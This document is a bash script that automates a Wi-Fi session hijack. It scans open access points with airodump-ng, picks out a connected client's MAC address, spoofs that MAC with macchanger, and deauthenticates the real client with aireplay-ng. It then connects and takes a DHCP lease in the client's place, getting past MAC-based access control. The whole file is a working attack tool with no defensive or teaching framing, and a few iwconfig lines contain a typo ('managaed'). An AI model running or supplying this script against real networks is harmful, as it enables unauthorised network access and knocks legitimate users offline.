#!/bin/bash
INT="`echo "${1}" | cut -c 1-6`"
AP="`echo "${2}"`"

MACADDRESS=`ifconfig wlan0 | grep ether | tr -s ' ' | cut -d ' ' -f3 | cut -c 1-17`
echo "Original MAC: $MACADDRESS" 

airmon-ng check kill
airmon-ng start $INT
echo "[>] Sniffing AP and client MAC Addresses..."
INTMON="`echo "${1}mon"`"
xterm -e "airodump-ng --encrypt opn -w aps $INTMON" & AIRODUMPPID=$!
sleep 10
kill ${AIRODUMPPID}

APMAC=`grep -m 1 $AP aps-01.csv | tr -s ' ' | cut -d ' ' -f1 | cut -c '1-17' | head -1`
echo "AP MAC: $APMAC"
CHNL=`grep -m 1 $AP aps-01.csv | tr -s ' ' | cut -d ' ' -f6 | tr -d ','`
sleep 1
xterm -e "airodump-ng -c $CHNL --bssid ${APMAC} -w aps $INTMON" & AIRODUMPPID1=$!
sleep 15
kill ${AIRODUMPPID1}
#HOSTMAC=`grep $AP aps-01.csv | tr -s ' ' | cut -d ' ' -f1 | cut -c '1-17' | tail -1`
HOSTMAC=`grep $APMAC aps-02.csv | tail -1 | tr -s ' ' | cut -d ' ' -f1 | cut -c '1-17'`
echo "HOST MAC $HOSTMAC"

sleep 2 
airmon-ng stop ${INTMON} #added mon

sleep 2
iwconfig wlan0 essid ${AP}

ifconfig ${INT} down
sleep 1
iwconfig wlan0 channel $CHNL
macchanger -m ${HOSTMAC} wlan0
echo "[>] Changing MAC..."
sleep 1
ifconfig ${INT} up
sleep 1
iwconfig wlan0 mode managaed essid ${AP}
sleep 1
aireplay-ng -0 1 -a $APMAC -c $HOSTMAC ${INT}
sleep 1
echo "[>] DeAUTHing target..."
ifconfig ${INT} down
sleep 1
iwconfig wlan0 mode managaed
sleep 1
ifconfig ${INT} up
sleep 1
iwconfig wlan0 essid ${AP}
sleep 3
echo "[>] Connecting to AP, getting dhcp..." 
dhclient wlan0
iwconfig ${INT}
ifconfig ${INT}

#rm *.ivs *.cap *.xor *kismet* *.csv 
#/etc/init.d/networking restart
#sleep 2
#service network-manager restart
echo "[>] Have Nice Day..."
exit 0

